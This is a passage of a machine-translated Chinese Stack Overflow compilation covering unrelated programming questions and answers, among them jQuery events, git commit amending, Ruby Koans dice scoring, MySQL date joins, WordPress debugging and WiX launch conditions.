来自这里的[链接](http://forum.jquery.com/topic/event-preventdefault-quirks) ， [这](https://stackoverflow.com/questions/4773868/opera-preventdefault-on-keydown-event)可能有助于歌剧的情况，这是一个略有不同的问题，但你也许可以让它工作

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-11-12T08:58:37.920

在大多数情况下，这应该适用于单击和焦点（使用选项卡）：

```
$('select').on('focus mousedown', function(e){
    e.stopPropagation();
    e.preventDefault();
    this.blur();
    window.focus();
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-01-06T17:46:08.463

这是一个已知的错误：[https](https://bugzilla.mozilla.org/show_bug.cgi?id=392863)
: //bugzilla.mozilla.org/show_bug.cgi?id=392863 它目前在 firefox ESR32 中。

如果像我一样，您在自定义 HTML/Javascript 选择下**隐藏** `<select>`了一个，并且仍然希望**将注意力集中**在该隐藏上`<select>`（用于可访问性、选项卡导航、箭头、输入...）。

只需使用`z-index: -1`.

```
.hidden-select {
  position: absolute;
  opacity: 0;
  filter: alpha(opacity=0);
  z-index: -1;
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-12-12T12:34:39.160

> 禁用未选择的元素（选项）。

$('select option:not(:selected)').attr("disabled",true);

# asp.net-mvc - ASP.NET MVC 填充动态文本框

> ID：11603457
> 
> 赞同：0
> 
> 时间：2012-07-22T19:47:43.327
> 
> 标签：asp.net-mvc

我正在学习和理解 asp.net MVC 和谷歌地图。刚刚在谷歌搜索时遇到了一个例子，并有疑问。

这就是我想要做的......

在表单中有 3 件事......一个动态 texbox、一个提交按钮和我正在尝试添加的“我的位置”按钮。

点击“我的位置”按钮，（我有 javascript 来获取我的坐标的纬度，长坐标）它应该显示在文本框上，只是想看看它是否正确拾取，然后我会点击提交按钮。

我在代码中看到了`<%html.texbox('addr')%>`我认为它是动态 texbox ...

这可能吗 ？我认为应该是，但我不确定如何。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T19:56:04.670

动态文本框是什么意思？每次用户单击按钮时的文本框？

<%html.texbox('addr')%> 语法是用于呈现文本框的东西，这不是动态的。这仅在渲染完整视图时渲染一次。您可以在此处阅读有关 asp.net MVC 视图引擎中输入扩展的更多信息[http://msdn.microsoft.com/en-us/library/system.web.mvc.html.inputextensions.textbox.aspx](http://msdn.microsoft.com/en-us/library/system.web.mvc.html.inputextensions.textbox.aspx)
我想要真正插入一个动态文本框，只要您单击按钮，您就可以使用 Jquery（已经存在于 VS 制作的新 MVC 项目中）。并做类似的事情

```
$('#divId').append($('<input type="text"/>')) 
```

你可以做类似的事情

```
var $tb = $('<input type="text" value="SOme_Value_Lat,LON"/>');
$('#divId').append($tb); 
```

# c# - 如何在不引入延迟的情况下频繁地在磁盘上存储信息？

> ID：11603472
> 
> 赞同：0
> 
> 时间：2012-07-22T19:49:05.847
> 
> 标签：c#, streamwriter

我真的不想在我的高频交易软件中引入任何延迟，同时我需要*每秒*存储数千行日志。1 毫秒的延迟会很大，我只同意 0.01-0.05 毫秒的延迟。

*现在*我只是在启动时在内存中分配 500 Mb，将日志存储在那里，当应用程序完成时，我将此日志放在磁盘上。

但是现在我意识到我想要更多的日志，并且在应用程序执行**期间**我想要它们。所以我现在想在应用程序执行期间存储日志（可能每分钟一次或每 10 分钟一次）。有多慢`StreamWriter.WriteLine`？它会比“添加到预先分配的集合”慢吗？

我应该`StreamWriter.WriteLine`直接使用（是同步还是异步，`AutoFlush`选项会影响性能吗？）。我还可以使用`BlockingCollection`将项目添加到日志，然后使用专用线程来处理此阻塞集合并将日志存储在另一个线程中的磁盘上。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T20:27:59.987

**别**

*   重新发明轮子

**做**

*   使用日志框架
*   为每个记录器正确配置记录器和级别
*   对内存使用*同步*日志记录（它简单快速，但在驱动器上存在事件持久性问题）和IO*异步*记录（很难正确、缓慢、更难测试）记录器

如果您还没有这样做，请查看[log4net](https://logging.apache.org/log4net)和[NLog](http://nlog-project.org/)，这将是一个很好的起点。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T19:59:32.020

可能您可以将日志存储在循环缓冲区中并生成一个新的执行线程，该线程只会将数据从共享内存中的缓冲区发送到磁盘。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-22T20:13:18.443

按照 Andre Calil 的建议使用 log4net。它记录到 SQL、磁盘和诸如此类的东西，并且非常可定制。起初它看起来有点复杂，但值得付出努力。

您需要的可能是`RollingFileAppender`. log4net 在 nuget 中，但您应该阅读 log4net 站点上的[文档](http://logging.apache.org/log4net/release/config-examples.html)。首先查看 appender 配置。

# git - 如何重命名推送到 GitHub 的 Git 提交？

> ID：11603473
> 
> 赞同：57
> 
> 时间：2012-07-22T19:49:24.377
> 
> 标签：git, version-control, github

我愚蠢地用一个非常混乱的提交名称向 GitHub 推送了一个提交。我该如何改变？

`git commit --amend`对已经推送的提交仍然有效吗？

* * *

## 回答 #1

> 赞同：111
> 
> 时间：2012-07-22T20:08:26.917

```
git commit --amend 
```

这会调出你的编辑器，或者

```
git commit --amend -m "Your new message here" 
```

这将允许您在命令行上指定新消息。也有可能，但如果您有其他要改写的提交，则更有用

```
git rebase -i HEAD^
# then replace 'pick' with 'r' or 'reword' and save, editor should pop up again to edit the msg 
```

由于此提交由于内容的更改而具有新的 SHA1，因此您需要强制推送新的引用。需要强制，因为它告诉 git 忘记之前的提交。这是一种安全措施。

```
git push origin your-branch-name -f 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2022-02-28T09:18:52.840

要更改已推送的提交，请执行此操作

```
git reset --soft HEAD~1
git add .
git commit -m "custom message"
git push -u -f origin master 
```

# jquery - 无法获得具有特定类的 div

> ID：11603474
> 
> 赞同：0
> 
> 时间：2012-07-22T19:49:28.693
> 
> 标签：jquery

我有一组元素，每个元素看起来像这样：

```
<div class="maindiv">
  <div id="55">
    <a class="aimg" onclick="showit(this);return false;">
      <img src="myjpg.jpg"/>
    </a>
    <div class="someclass"></div>
    <div class="getit"></div>
  </div>
 </div> 
```

“getit”类的显示设置为“无”。我需要“onclick=show”函数将“getit”分类的 div 的显示放到“block”中。

我在“showit()”函数中尝试了以下内容：

```
$(this).parent().find('.getit:first').css('display', 'block'); 
```

但它不起作用......

我希望这里有人可以帮助我！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T20:01:35.250

删除 onclick 处理程序，因为内联 javascript 通常不是最好的解决方案，而是阻止单击处理程序中的默认操作。

```
<div class="maindiv">
  <div id="55">
    <a class="aimg">
      <img src="myjpg.jpg"/>
    </a>
    <div class="someclass"></div>
    <div class="getit">dsdadsa</div>
  </div>
</div>​​​ 
```

然后找到具有正确班级的兄弟姐妹并展示它。

```
$(".aimg")​.on('click', function(e) {
    e.preventDefault();
    $(this).siblings(".getit").show();
})​;​ 
```

[小提琴](http://jsfiddle.net/p2JxS/)

或者，如果您只需要具有 onclick 功能（这是不必要的）：

```
<div class="maindiv">
  <div id="55">
    <a class="aimg" onclick="showit(this);return false;">
      <img src="myjpg.jpg"/>
    </a>
    <div class="someclass"></div>
    <div class="getit">dsdadsa</div>
  </div>
 </div>

​&lt;script type="text/javascript"​​​​​​​​​​​​​​​​​​​​​​​​​​&gt;
    function showit(elem) {
        $(elem).siblings(".getit").show();
    }
</script> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-22T20:08:13.677

`this`在`showit`函数中将表示窗口对象而不是`<a>`标签。

使用显示函数声明中使用的参数名称，例如

```
function showit(element){
    //other stuff
    $(element).parent().find('.getit:first').css('display', 'block');
    //other stuff
} 
```

或者

```
function showit(){
    //other stuff
    $(arguments[0]).parent().find('.getit:first').css('display', 'block');
    //other stuff
} 
```

要在不更改功能`this`的情况下用作标签，您可以[调用](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Function/call)`<a>``showit`

```
<a class="aimg" onclick="showit.call(this);return false;"> 
```

您也可以将事件处理程序绑定到元素，而不必乱用属性

```
$(".aimg")​.on('click', function() {
    //other stuff
    $(this).siblings(".getit").css('display', 'block');
    //other stuff
})​;​ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-22T19:51:42.770

在 links 父元素上找到`div.getit`using函数。元素`.find()`。`<div id="55">`

这里的关键是通过将传入的`e`事件对象（`$()``.parent()``.find()`

```
function showit(e){
  $(e).parent().find('div.getit').show();
}; 
```

* * *

jQuery 文档对这个函数有[这样](http://api.jquery.com/show/)的说法`.show()`——

> 匹配的元素将立即显示，没有动画。这大致相当于调用`.css('display', 'block')`，除了显示属性恢复到最初的状态。如果一个元素的显示值为`inline`，则隐藏并显示，它将再次内联显示。
> 
> 注意：如果`!important`在您的样式中使用，例如，如果您希望正确运行`display: none !important`，则有必要覆盖样式 using `.css('display', 'block !important')``.show()`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-22T20:01:18.103

这样做： -

## HTML：

```
<div class="maindiv">
  <div id="55">
    <a class="aimg">
      <img src="http://www.gravatar.com/avatar/cfda66988653015c6791d5da11ebbc2c?s=32&d=identicon&r=PG"/>
    </a>
    <div class="someclass"></div>
    <div class="getit"></div>
  </div>
 </div>​ 
```

## JS：

```
$('.aimg').one('click', function() {
    $(this).parent().find('.getit:first').css('display', 'block');
}); 
```

## CSS：

```
.getit {
    display: none;
    border: 1px solid;
    width: 50px;
    height: 50px;
}​ 
```

参考**[现场演示](http://jsfiddle.net/SivaCharan/rAKSz/)**

# ruby - Ruby Koans 评分项目

> ID：11603477
> 
> 赞同：2
> 
> 时间：2012-07-22T19:49:41.167
> 
> 标签：ruby

我正在研究 Ruby Koans，我在弄清楚我编写的方法出了什么问题时遇到了一些麻烦。我在 about_scoring_project.rb 中，我已经为骰子游戏编写了 score 方法：

```
def score(dice)
  return 0 if dice == []
  sum = 0
  rolls = dice.inject(Hash.new(0)) { |result, element| result[element] += 1; result; }
  rolls.each { |key, value| 
    # special condition for rolls of 1
    if key == 1  
      sum += 1000 | value -= 3 if value >= 3
      sum += 100*value
      next
    end
    sum += 100*key | value -= 3 if value >= 3
    sum += 50*value if key == 5 && value > 0
  }
  return sum
end 
```

对于不熟悉这项运动的人：

> 贪婪是一个骰子游戏，您最多可以滚动五个骰子来累积积分。下面的“分数”函数将用于计算单次掷骰子的分数。
> 
> 贪婪滚动评分如下：
> 
> *   一组三个是1000分
>     
>     
> *   一组三个数字（除了一个）的价值是该数字的 100 倍。（例如三个五是500分）。
>     
>     
> *   一个（不是一组三个的一部分）值 100 分。
>     
>     
> *   一个五（不是一组三的一部分）值 50 分。
>     
>     
> *   其他的都值0分。
>     
>     
> 
> 例子：
> 
> score([1,1,1,5,1]) => 1150 分 score([2,3,4,6,2]) => 0 分 score([3,4,5,3,3]) => 350 分得分([1,5,1,2,4]) => 250 分
> 
> 下面的测试中给出了更多评分示例：
> 
> 你的目标是编写 score 方法。

当我尝试运行文件中的最后一个测试时遇到了麻烦：`assert_equal 550, score([5,5,5,5])`

出于某种原因，我返回 551 而不是 550。感谢您的帮助！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2015-08-19T11:18:55.607

这是我的方法：

```
def score(dice)
  # Count how many what
  clusters = dice.reduce(Hash.new(0)) {|hash, num| hash[num] += 1; hash }

  # Since 1's are special, handle them first
  ones = clusters.delete(1) || 0
  score = ones % 3 * 100 + ones / 3 * 1000

  # Then singular 5's
  score += clusters[5] % 3 * 50

  # Then the triples other than triple-one
  clusters.reduce(score) {|s, (num, count)| s + count / 3 * num * 100 }
end 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2017-08-24T16:36:45.573

我的方法使用两个查找表 - 一个包含三倍的分数，另一个包含单打的分数。我使用表格计算出每个数字的分数，并使用以下方法累积总分`inject`：

```
def score(dice)
  triple_scores = [1000, 200, 300, 400, 500, 600]
  single_scores = [100, 0, 0, 0, 50, 0]
  (1..6).inject(0) do |score, number|
    count = dice.count(number)
    score += triple_scores[number - 1] * (count / 3)
    score += single_scores[number - 1] * (count % 3)
  end
end 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-22T20:21:47.583

这是因为您实际上是将`|`运算符（按位或）的结果添加到总分中：

```
sum += 100*key | value -= 3 if value >= 3 # This is 501 in your case 
```

证明：

```
irb(main):004:0> value = 4
=> 4
irb(main):005:0> 100 * 5 | value -= 3 # This should be read as (500) | 1 which is 501
=> 501 
```

所以像这样重写它：

```
if value >= 3
  sum += 100 * key
  value -= 3
end 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2015-12-23T19:16:08.643

我和

```
def score(dice)
  dice.uniq.map do |die|
    count = dice.count die
    if count > 2
      count -= 3
      die == 1 ? 1000 : 100 * die
    else 0
    end + case die
          when 1 then count * 100
          when 5 then count * 50
          else 0
          end
  end.inject(:+) || 0
end 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2014-01-30T14:39:14.253

我的方法是：

```
def score(dice)
  calculator = ->(no, group_multipler, individual_multipler) { (no / 3 * group_multipler) + (no % 3 * individual_multipler) }
  dice.group_by {|i| i % 7 }.inject(0) do |total, (value, scores)|
    group_multipler, individual_multipler = case value
    when 1
      [1000, 100]
    when 5
      [500, 50]
    else 
      [value * 100, 0]
    end
    total += calculator.call(scores.size, group_multipler, individual_multipler)
  end
end 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2015-11-17T05:46:00.457

我的做法：

```
 def score(dice)
        score = 0
        score += dice.count(1) >= 3? (1000+ (dice.count(1) -3)*100): dice.count(1) * 100
        score += dice.count(5) >= 3 ? (500 + (dice.count(5) -3)*50): dice.count(5) * 50
       [2,3,4,6].each {|x| dice.count(x) >=3? score+= x*100:0}
       return score
    end 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2016-12-12T13:58:08.017

这是我的答案：

```
def score(dice)
  frequency = dice.inject(Hash.new(0)) do |h, el|
    h[el] += 1
    h
  end

  score_triples = { 1 => 1000 }
  score_singles = { 1 => 100, 5 => 50 }

  score = 0
  frequency.each do |k, v|
    score += v / 3 * score_triples.fetch(k, 100 * k)
    score += v % 3 * score_singles.fetch(k, 0)
  end
  score
end 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2017-04-04T19:00:12.347

我的方法使用整数除法和模除法：

```
def score(dice)
    points = 1000 * (dice.count(1) / 3)
    points += 100 * (dice.count(1) % 3)
    points += 50 * (dice.count(5) % 3)
    (2..6).each do |i|
        points += (100 * i) * (dice.count(i) / 3)
    end
    points
end 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2016-05-11T18:27:22.810

这是我的解决方案。

```
def score(dice)
    score = 0
    # grab all the numbers and their amounts
    number_amounts = dice.reduce(Hash.new(0)) { |hash, numb| hash[numb] += 1; hash }

    # iterate through each pair
    number_amounts.each do |key, value|
      # case with number 1
      score += (value % 3) * 100 + value / 3 * 1000 if (key == 1)
      # case with number 5
      score += (value % 3) * 50 + value / 3 * key * 100 if (key == 5)
      # all numbers except 1 and 5
      score += (value / 3) * key * 100 if (key != 1 && key != 5)
    end
    score
end 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2016-07-09T10:07:23.253

```
 def score(dice)
  # Set up rules Hash
  rules = { 1 => {:triples => 1000, :singles => 100}, 5 => {:triples => 100, :singles => 50} }
  [2,3,4,6].each {|i| rules[i] = {:triples => 100, :singles => 0} }
  # Count all ocourencies
  counts = dice.each_with_object(Hash.new(0)) {|e, h| h[e] += 1}

  #calculate total
  total = 0
  counts.each_pair{ | key, value | 
    total += value >= 3? (rules[key][:triples]*key + (value -3)*rules[key][:singles]): value * rules[key][:singles]
  }
  return total
end 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2020-08-05T14:37:37.227

这是我自己编写的第一段代码（当然，在 stackoverflow 的大量帮助下。）在看了所有其他答案之后，我意识到这特别过分，因为它适用于 9 数字骰子（存在吗？ )

```
 def score(dice)

  if dice.empty?
    return 0
  end

  var_score = 0

  conteo = (0..9).to_a.each.map { |x| dice.count(x)} 

  #Evaluating 1
  if ( conteo[1] / 3 ) >= 0
    multiplier1 = conteo[1]/3
    var_score += multiplier1 * 1000
  end

  if ( conteo[1] % 3 ) != 0
    var_score += (conteo[1] % 3)*100
  end

  #Evaluating 5
  if ( conteo[5] % 3 ) != 0
    var_score += (conteo[5] % 3)* 50
  end

  #Evaluating numbers x 3    
  if (conteo[2..9].count { |x| x >= 3 }) > 0
    triplets = conteo[2..9].map {|x| x / 3}
    array_multiplicator = triplets.each_with_index.select {|num,index| (num > 0)}.map {|x| x[0]}
    product_triplets = triplets.each_with_index.select {|num,index| (num > 0)}.map {|x| x[1]}.map {|x| (x+2)*100}
    var_score += array_multiplicator.zip(product_triplets).map{|x| x.inject(&:*)}.sum
  end

  var_score
end 
```

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2020-09-14T00:10:45.270

花了 29 行，但这是我的第一个 Ruby

```
 def score(dice)
      return 0 if dice == [] 
      sums = Array.new  # To hold number of occurrences 1 - 6
      for i in 0..6     # Initialize to 0... note [0] is not used 
        sums[i] = 0
      end
      total = 0   # To hold total
      dice.each do |dots|   # Number of dots showing on dice
        sums[dots] += 1     # Increment the array members 1 - 6
      end 
        if sums[1] > 2 then # If 3 1's
          total += 1000 
          sums[1] -= 3   # Remove the 3 you took, in case there's more
        end
        if sums[2] > 2  then total += 200  # If 3 2's
        end
        if sums[3] > 2  then total += 300   #If 3 3's
        end
        if sums[4] > 2  then total += 400    #If 3 4's
        end
        if sums[5] > 2  then total += 500     #If 3 5's
          sums[5] -= 3                        #Remove the 5's you took
        end
        if sums[6] > 2  then total += 600  #If 3 6's
        end
     total += (sums[1] * 100)   # If any ones are left
     total += (sums[5] * 50)    # Same for fives
     return total
end 
```

* * *

## 回答 #13

> 赞同：-1
> 
> 时间：2014-09-22T09:44:31.390

```
def score(dice)
    score = 0
    dice.uniq.each do |number|
        count = dice.count number
        weight = if number == 1 then 10 else number end
        if count >= 3
            score += weight * 100
            count -= 3
        end
        if count > 0 and number == 1 or number == 5
            score += count * weight * 10
        end
    end
    score
end 
```

* * *

## 回答 #14

> 赞同：-2
> 
> 时间：2017-09-25T11:52:40.940

```
def score(dice)
    ones = fives = rest = 0

    one_count = dice.count(1)
    if one_count > 2
        ones = 1000
        one_count -= 3
    end
    ones += one_count * 100

    five_count = dice.count(5)
    if five_count > 2
        fives = 500
        five_count -= 3
    end
    fives += five_count * 50

    [2,3,4,6].each do |num|
        if dice.count(num) > 2
            rest += num * 100
        end
    end

    return ones + fives + rest
end 
```

# mysql - MySQL 日期列在日、月年

> ID：11603480
> 
> 赞同：0
> 
> 时间：2012-07-22T19:50:29.883
> 
> 标签：mysql

我有一个 MySQL 表 (A)，其中包含三个名为“日”、“月”和“年”的列，每个列中存储一个数字，当一起阅读时，将代表一个日期。我必须将此表与另一个表 (B) 连接，其中日期列是 UNIX 格式。有没有一种简单的方法可以让我轻松地比较两张表中的两个日期？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T19:54:25.490

您可以通过字段连接来管理值

```
SELECT CONCAT(year, '-', month, '-', day) as u_date ... 
```

或者

```
SELECT ... WHERE CONCAT(A.year, '-', A.month, '-', A.day) > B.another_field 
```

ETC ...

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-22T19:54:50.023

你可以做：

```
SELECT *
FROM tbl a
INNER JOIN tbl b 
    ON UNIX_TIMESTAMP(CAST(CONCAT(a.year, '-', a.month, '-', a.day) AS DATETIME)) = b.unixtimecol 
```

但是中的unix时间戳列`tableB`更精确到秒，而你的列`tableA`只能精确到当天。因此，它可能并不总是在您想要的时候加入。

如果您希望它加入同一天内的两个时间，您还可以将 unix 时间列设置为一个`DATE`类型，以便两者都只精确到当天：

```
SELECT *
FROM tbl a
INNER JOIN tbl b 
    ON CAST(CONCAT(a.year, '-', a.month, '-', a.day) AS DATE) = DATE(FROM_UNIXTIME(b.unixtimecol)) 
```

# wordpress - wp-config.php 的更改何时生效？

> ID：11603487
> 
> 赞同：33
> 
> 时间：2012-07-22T19:51:51.007
> 
> 标签：wordpress

我正在尝试在 WordPress 网站上启用调试以调试插件。我阅读了有关[WP_DEBUG](http://codex.wordpress.org/Debugging_in_WordPress)设置的信息，并将以下内容添加到我的`wp-config.php`文件中：

```
define('WP_DEBUG', true);
define('WP_DEBUG_LOG', true);
define('WP_DEBUG_DISPLAY', false); 
```

我的理解是我应该`debug.log`在我的`wp-content`目录中看到一个文件。我还没有看到任何东西，但我不知道这是因为没有记录任何错误，或者是否需要重新启动某些东西才能使这些设置生效。所以我的问题是什么时候`wp-config.php`读取设置，我是否需要重新启动任何服务才能使更改生效。

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2012-07-22T20:39:52.230

“更改”`wp-config.php`在通过 FTP 或通过 shell 编辑时立即发生，因为每次 WordPress 生成和输出任何页面时都会访问该文件。无需重启服务器；只需加载或刷新 WordPress 网站的任何前端或后端页面。

做一些事情来触发 php 错误，比如从主题的 php 函数中删除一个括号`header.php`，看看它是否被登录`debug.log`。检查 中的`debug.log`错误`wp-content`。

如果该文件不存在，则可能存在权限问题，WordPress 无法创建该文件。所以添加一个纯文本文件（为您的系统使用正确的文本编码；最好使用 FTP 客户端创建几个文件）并命名它`debug.log`。如果你在本地创建文件并上传，至少给它755的权限，但644更安全。然后再次调用 php 错误并查看它是否被记录。

# javascript - 仅在 Internet Explorer 中的 Javascript endess 循环

> ID：11603491
> 
> 赞同：0
> 
> 时间：2012-07-22T19:52:14.517
> 
> 标签：javascript, internet-explorer-9, infinite-loop

在 IE 上运行我的 javascript 程序时，它会永远循环。

它适用于 Firefox、Safari 和 Chrome。

Stackoverflow 中有一个类似的问题，但这里的建议是删除嵌入函数的函数名。我没有名字。

这里摘录了一个设置异步 httprequest 的函数。'rq' 是请求对象，已经调用了 open()，但没有调用 send()。

我正在尝试设置响应功能。我正在使用“self”var，以便函数具有相同的 this 指针（也是与调用函数相同的对象的成员）。

```
var self = this;
rq.onreadystatechange = function()
{
    self._reqStateChange(rq);     // *
}                                 // *
this._req[sl]=rq;
rq.send(null);
return true; 
```

IE 无限循环用 // * 标记的两行，也是嵌入函数中的第一个返回：

```
this._reqStateChange = function(rq)
{
    if( (!rq) || rq.readyState!=4 )
        return;    // exits here every time. 
```

IE 9.0，使用内置调试器。

没有 jQuery 或任何其他库。

我不知道。谢谢你的帮助。我想了解这里的逻辑...

笔记：

我只是建了一个小脚本，看看自建有没有错。这样可行。似乎与onreadystatechange函数有关。每次它退出时，都会立即再次调用它。

此代码不会锁定在 IE 中：

```
someObject = function()
{
    this.callback = function(){}
    this.funcCallsCallback = function()
    {
        // call the callback
        this.callback();
    };
}
muell = new function()
{
    this.value = 42;
    this.test = function()
    {
        var rq = new someObject();
        var self = this;
        rq.callback = function()
        {
            self.endFunc();
        }
        // now:
        rq.funcCallsCallback();
    };
    this.endFunc = function()
    {
        alert("called! value="+this.value.toString());
    };
}

muell.test(); 
```

# sql-server - 在 SQL Server 中使用 XML 进行更新

> ID：11603496
> 
> 赞同：1
> 
> 时间：2012-07-22T19:52:57.647
> 
> 标签：sql-server, xml, sql-server-2008

我正在尝试使用 xml 更新表。

```
UPDATE dbo.M_Picture
SET Sequence = T.c.query('Sequence')
FROM dbo.M_Picture pic
INNER JOIN @xml.nodes('/pictures/picture') T(c)
ON pic.PictureId = T.c.query('pictureId') --I guess issue is in this line 
```

我使用的 XML 是

```
<pictures>
  <picture>
    <pictureId>30</pictureId>
    <Sequence>4</Sequence>
  </picture>
  <picture>
    <pictureId>31</pictureId>
    <Sequence>4</Sequence>
  </picture>
</pictures> 
```

我收到的错误消息是

> 操作数类型冲突：xml 与 int 不兼容

这是有道理的，因为在

```
pic.PictureId=T.c.query('pictureId') 
```

`pictureId`是`int`

如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T19:57:20.610

试试这个：

```
UPDATE dbo.M_Picture
SET Sequence = T.c.query('Sequence')  -- this here *also* assign an XML fragment to "Sequence"
FROM dbo.M_Picture pic
INNER JOIN @xml.nodes('/pictures/picture') T(c)
ON pic.PictureId = T.c.value('(pictureId)[1]', 'int') 
```

使用`.value()`XML 上的方法 - 返回标量类型（如`int`）

另外：我不确定您是否真的想将 XML 片段分配`<Sequence>4</Sequence>`给您的列`Sequence`- 或者您是否也想在`.value()`那里使用该方法！

# cocoa-touch - 如何使 NSURL 缓存？

> ID：11603502
> 
> 赞同：1
> 
> 时间：2012-07-22T19:53:26.853
> 
> 标签：cocoa-touch, nsurl

我的应用程序对服务器做了很多请求。很多这些请求都引用了相同的资源。

我想知道我是否应该做些什么来帮助双方节省时间和精力并简单地缓存响应？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T20:11:03.220

默认情况下，请求缓存 60 秒。这可以通过 的`cachePolicy:`和`timeoutInterval:`参数来控制`NSURLRequest`。

**添加：**

如果您在 then 中实现`connection:willCacheResponse:`，您`NSURLConnectionDelegate`可以看到缓存了哪些响应。

# c# - 如果没有 RegistryValue 或 RegistryValue 低于 1.3.44，则 WiX 中的产品 LaunchCondition

> ID：11603503
> 
> 赞同：1
> 
> 时间：2012-07-22T19:53:30.910
> 
> 标签：c#, .net, wix, registry, windows-installer

（*我需要让它直接为 Product / .msi 工作，而不是通过使用 Bundle / Burn*。）

（*我使用的是 WiX 3.6。*）

### 将注册表值放入变量的片段

```
<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi" xmlns:util="http://schemas.microsoft.com/wix/UtilExtension">
  <?include $(sys.CURRENTDIR)Deployment\Data\Statics.wxi ?>
  <Fragment>
    <util:RegistrySearch Root="HKCU" Key="$(var.Line.Reg.Path)" Value="Version" Variable="AppAlreadyInstalled" />
  </Fragment>
</Wix> 
```

### 非工作状态的主要产品

```
<Product Name="$(var.App.Title)" Manufacturer="!(loc.Company)" Language="!(loc.Lang)" Id="*" Version="$(var.VersionNumber)" UpgradeCode="$(var.App.UpgradeCode)">
    <Package Id="*" InstallerVersion="300" Compressed="yes" InstallScope="$(var.App.Elevation)" InstallPrivileges="limited" />
    <DirectoryRef Id="TARGETDIR" />
    <MajorUpgrade Schedule="afterInstallValidate" DowngradeErrorMessage="!(loc.Msi.NewerVersionInstalled)" />
    <Property Id='DiskPrompt' Value="$(var.App.Title) Installation Media" />
    <Media Id="1" Cabinet="Media.cab" EmbedCab="yes" DiskPrompt="#1" />
    <Icon Id="AppIcon" SourceFile="$(var.Icon.Path)" />

    <Condition Message="Newer version already installed.">
        <![CDATA[Installed OR AppAlreadyInstalled]]>
    </Condition>

    <Feature Id="ProductFeature" Level="1">
         ...
    </Feature>
</Product> 
```

*   我相信**AppAlreadyInstalled**目前从未设置，因为它位于不同文件的片段中。
*   然后，如果根本找不到注册表值/不存在，我实际上希望继续安装。
*   但如果它确实存在，我希望仅在注册表值低于某个值时继续安装，例如，仅在**AppAlreadyInstalled < 1.3.44**时继续安装；这听起来很难实现，因为注册表值存储为带有两个句号/句点的字符串。
*   注意注册表检查不是要安装的应用程序，它已经由 DowngradeErrorMessage 处理。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-23T05:00:17.640

[`WixUtilExtension:RegistrySearch`](http://wix.sourceforge.net/manual-wix3/util_xsd_registrysearch.htm)仅适用于捆绑包。[`RegistrySearch`](http://wix.sourceforge.net/manual-wix3/wix_xsd_registrysearch.htm)您需要在 WiX 命名空间中使用纯文本。您可以使用[RegistrySearchRef](http://wix.sourceforge.net/manual-wix3/wix_xsd_registrysearchref.htm)从单独的片段中提取[RegistrySearch 。](http://wix.sourceforge.net/manual-wix3/wix_xsd_registrysearch.htm)

However, you're right that a version comparison is problematic: MSI does ordinal string comparisons so `1.2 > 1.10`. If the install directory is in the registry, you might be better off using a [RegistrySearch](http://wix.sourceforge.net/manual-wix3/wix_xsd_registrysearch.htm) combined with a [DirectorySearch](http://wix.sourceforge.net/manual-wix3/wix_xsd_directorysearch.htm) and a [FileSearch](http://wix.sourceforge.net/manual-wix3/wix_xsd_filesearch.htm). `FileSearch` can search by version using the `MinVersion` attribute so if there's a file with a version you can use to detect the product, it'll be more reliable than string comparisons.

# ios - NSBundle 为给定路径创建文件

> ID：11603507
> 
> 赞同：0
> 
> 时间：2012-07-22T19:54:02.393
> 
> 标签：ios, nsbundle

当我使用 `NSString *path = [[NSBundle mainBundle] pathForResource:name ofType:@"sqlite"];`

当文件不包含在 Xcode 中时，对于给定的文件名，NSBundle 类不是返回 nil，而是无论如何都在创建文件。我尝试从 xcode 中删除文件，但没有成功，然后我转到项目的模拟器路径（该路径由 pathForResource 生成）：

> /Users/USER_NAME/Library/Application Support/iPhoneSimulator/6.0/Applications/APP_CODE/APP_NAME.app/sampleDB.sqlite

在调试器中运行程序之前，我手动删除了文件“sampleDB.sqlite”。每次调用 pathForResource 方法时，文件似乎都会神奇地重新出现在文件夹中。

文档说明：返回类型：资源文件的完整路径名，如果找不到文件，则返回 nil。

编辑：

注释掉 pathForResource 后，文件被删除 - 我仍然让该文件神奇地重新出现在包中。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T20:04:26.080

进行干净的构建以确保从应用程序包中删除该文件。

# ruby - 在 Ruby 中为一组子类定义同一个类实例变量的访问器

> ID：11603508
> 
> 赞同：0
> 
> 时间：2012-07-22T19:54:04.263
> 
> 标签：ruby, class-instance-variables

我有一个超类和一组子类。在每个子类中，我定义了一个具有相同名称的类实例变量`x`。要为这些类之一创建访问器，我只需在子类定义中使用：

```
class << self
  attr_accessor :x
end 
```

